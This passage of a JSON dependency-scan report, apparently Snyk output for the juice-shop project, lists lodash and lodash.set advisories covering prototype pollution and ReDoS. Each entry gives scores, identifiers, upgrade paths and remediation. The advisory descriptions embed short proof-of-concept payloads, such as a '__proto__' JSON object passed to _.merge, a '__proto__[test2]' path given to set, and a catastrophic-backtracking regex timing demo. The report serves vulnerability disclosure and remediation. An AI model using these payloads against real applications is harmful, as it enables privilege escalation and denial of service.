`merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.11 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1066)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1068)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1071)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/782)\n- [POC: HackerOne Report](https://hackerone.com/reports/380873)\n",
        "epssDetails": {
          "percentile": "0.43291",
          "probability": "0.00207",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2018-16487"
          ],
          "CWE": [
            "CWE-1321"
          ],
          "NSP": [
            "1066",
            "1068",
            "1071",
            "782"
          ],
          "GHSA": [
            "GHSA-4xc9-xhrj-v574"
          ]
        },
        "packageName": "lodash",
        "proprietary": true,
        "creationTime": "2019-02-03T09:06:37.726000Z",
        "functions_new": [
          {
            "version": [
              ">=4.17.5 <4.17.11"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "safeGet"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.baseMerge"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.assignMergeValue"
            }
          },
          {
            "version": [
              ">=3.0.0 <4.0.0"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "runInContext.baseMerge"
            }
          },
          {
            "version": [
              ">=3.0.0 <4.0.0"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.3"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.mergeDefaults"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.merge"
            }
          },
          {
            "version": [
              ">=0.9.0 <1.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "merge"
            }
          },
          {
            "version": [
              ">=1.0.0 <1.0.3"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "functionName": "merge"
            }
          },
          {
            "version": [
              ">=1.1.0 <2.0.0"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "functionName": "runInContext.merge"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2018-08-31T18:21:00Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2019-02-01T18:21:00Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-07-09T12:48:35.271273Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "SNYK-JS-LODASH-73639",
        "title": "Regular Expression Denial of Service (ReDoS)",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H/E:P",
        "credit": [
          "cristianstaicu"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.11"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.11"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 4.4,
        "functions": [
          {
            "version": [
              ">=4.15.0 <4.17.11"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "hasUnicodeWord"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/lodash/lodash/pull/4450",
            "title": "GitHub PR"
          },
          {
            "url": "https://github.com/lodash/lodash/issues/3359",
            "title": "POC: GitHub Issue"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "cvssV3BaseScore": 6.5,
            "modificationTime": "2024-03-11T09:47:22.679024Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:H/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 4.4,
            "cvssVersion": "3.1",
            "modificationTime": "2024-06-19T12:38:24.499229Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:47:22.679024Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). It parses dates using regex strings, which may cause a slowdown of 2 seconds per 50k characters.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `lodash` to version 4.17.11 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/5c08f18d365b64063bfbfa686cbb97cdd6267347)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4450)\n- [POC: GitHub Issue](https://github.com/lodash/lodash/issues/3359)\n",
        "epssDetails": {
          "percentile": "0.28129",
          "probability": "0.00098",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2019-1010266"
          ],
          "CWE": [
            "CWE-185"
          ]
        },
        "packageName": "lodash",
        "proprietary": false,
        "creationTime": "2019-02-03T09:18:05.060741Z",
        "functions_new": [
          {
            "version": [
              ">=4.15.0 <4.17.11"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "hasUnicodeWord"
            }
          }
        ],
        "alternativeIds": [],
        "disclosureTime": "2017-09-05T09:14:29Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2019-04-05T09:14:22Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-06-19T12:38:24.499229Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "npm:lodash:20180130",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P",
        "credit": [
          "Olivier Arteau (HoLyVieR)"
        ],
        "semver": {
          "vulnerable": [
            "<4.17.5"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [
          "4.17.5"
        ],
        "patches": [
          {
            "id": "patch:npm:lodash:20180130:0",
            "urls": [
              "https://snyk-patches.s3.amazonaws.com/npm/lodash/20180130/20180130_0_0_lodash_d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a.patch"
            ],
            "version": "=3.10.1",
            "comments": [],
            "modificationTime": "2019-12-03T11:40:45.883000Z"
          }
        ],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "medium",
        "cvssScore": 6.3,
        "functions": [
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.baseMerge"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=3.0.0 <4.0.0"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "runInContext.merge"
            }
          },
          {
            "version": [
              ">=1.1.0 <2.0.0"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "className": null,
              "functionName": "runInContext.merge"
            }
          },
          {
            "version": [
              ">=0.9.0 <1.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "className": null,
              "functionName": "merge"
            }
          },
          {
            "version": [
              ">= 1.0.0 <1.0.3"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "className": null,
              "functionName": "merge"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash",
        "references": [
          {
            "url": "https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/lodash/lodash/pull/4337",
            "title": "GitHub PR"
          },
          {
            "url": "https://hackerone.com/reports/310443",
            "title": "HackerOne Report"
          },
          {
            "url": "https://www.npmjs.com/advisories/1067",
            "title": "NPM Security Advisory"
          },
          {
            "url": "https://www.npmjs.com/advisories/1069",
            "title": "NPM Security Advisory"
          },
          {
            "url": "https://www.npmjs.com/advisories/1070",
            "title": "NPM Security Advisory"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "NVD",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
            "cvssV3BaseScore": 6.5,
            "modificationTime": "2024-03-11T09:52:21.230985Z"
          },
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.0/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 2.9,
            "modificationTime": "2024-03-11T09:53:48.131687Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L/E:P",
            "assigner": "Snyk",
            "severity": "medium",
            "baseScore": 6.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-07-09T12:50:20.697099Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
            "assigner": "NVD",
            "severity": "medium",
            "baseScore": 6.5,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-11T09:52:21.230985Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.0/AV:L/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 2.9,
            "cvssVersion": "3.0",
            "modificationTime": "2024-03-11T09:53:48.131687Z"
          }
        ],
        "description": "## Overview\n[lodash](https://www.npmjs.com/package/lodash) is a modern JavaScript utility library delivering modularity, performance, & extras.\n\nAffected versions of this package are vulnerable to Prototype Pollution. The utilities function allow modification of the `Object` prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property.  \r\n\r\n## PoC by Olivier Arteau (HoLyVieR)\r\n```js\r\nvar _= require('lodash');\r\nvar malicious_payload = '{\"__proto__\":{\"oops\":\"It works !\"}}';\r\n\r\nvar a = {};\r\nconsole.log(\"Before : \" + a.oops);\r\n_.merge({}, JSON.parse(malicious_payload));\r\nconsole.log(\"After : \" + a.oops);\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `lodash` to version 4.17.5 or higher.\n## References\n- [GitHub Commit](https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a)\n- [GitHub PR](https://github.com/lodash/lodash/pull/4337)\n- [HackerOne Report](https://hackerone.com/reports/310443)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1067)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1069)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1070)\n",
        "epssDetails": {
          "percentile": "0.34826",
          "probability": "0.00139",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2018-3721"
          ],
          "CWE": [
            "CWE-1321"
          ],
          "NSP": [
            "1067",
            "1069",
            "1070",
            "577"
          ],
          "GHSA": [
            "GHSA-2m96-9w4j-wgv7",
            "GHSA-46fh-8fc5-xcwx",
            "GHSA-5947-m4fg-xhqg",
            "GHSA-fvqr-27wr-82fm"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-LODASH-174180",
            "npm:lodash:20180130"
          ]
        },
        "packageName": "lodash",
        "proprietary": true,
        "creationTime": "2018-02-12T22:28:27.654000Z",
        "functions_new": [
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.baseMerge"
            }
          },
          {
            "version": [
              ">=4.0.0 <4.17.5"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=3.0.0 <4.0.0"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "runInContext.baseMergeDeep"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "runInContext.merge"
            }
          },
          {
            "version": [
              ">=1.1.0 <2.0.0"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "functionName": "runInContext.merge"
            }
          },
          {
            "version": [
              ">=0.9.0 <1.0.0"
            ],
            "functionId": {
              "filePath": "lodash.js",
              "functionName": "merge"
            }
          },
          {
            "version": [
              ">= 1.0.0 <1.0.3"
            ],
            "functionId": {
              "filePath": "dist/lodash.js",
              "functionName": "merge"
            }
          }
        ],
        "alternativeIds": [
          "SNYK-JS-LODASH-174180"
        ],
        "disclosureTime": "2018-01-30T22:28:27Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2018-02-14T13:22:50Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-07-09T12:50:20.697099Z",
        "socialTrendAlert": false,
        "severityWithCritical": "medium",
        "from": [
          "juice-shop@19.0.0",
          "sanitize-html@1.4.2",
          "lodash@2.4.2"
        ],
        "upgradePath": [
          false,
          "sanitize-html@1.7.1"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "lodash",
        "version": "2.4.2"
      },
      {
        "id": "SNYK-JS-LODASHSET-1320032",
        "title": "Prototype Pollution",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
        "credit": [
          "awarau"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "lodash.set",
        "references": [
          {
            "url": "https://hackerone.com/reports/864701",
            "title": "HackerOne Report"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.3,
            "cvssVersion": "3.1",
            "modificationTime": "2024-04-15T16:31:58.604260Z"
          }
        ],
        "description": "## Overview\n[lodash.set](https://www.npmjs.com/package/lodash.set) is a lodash method _.set exported as a Node.js module.\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `set` and `setwith` functions due to improper user input sanitization.\n\n**Note**\r\n\r\n`lodash.set` is not maintained for a long time. It is recommended to use `lodash` library, which contains the fix since version 4.17.17.\n\n## PoC\n```js\r\nlod = require('lodash')\r\nlod.set({}, \"__proto__[test2]\", \"456\")\r\nconsole.log(Object.prototype)\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nThere is no fixed version for `lodash.set`.\n## References\n- [HackerOne Report](https://hackerone.com/reports/864701)\n",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-1321"
          ]
        },
        "packageName": "lodash.set",
        "proprietary": false,
        "creationTime": "2021-07-19T12:00:32.890460Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2020-08-21T10:34:29Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2020-08-21T12:53:03Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-04-15T16:31:58.604260Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "grunt-replace-json@0.1.0",
          "lodash.set@4.3.2"
        ],
        "upgradePath": [],
        "isUpgradable": false,
        "isPatchable": false,
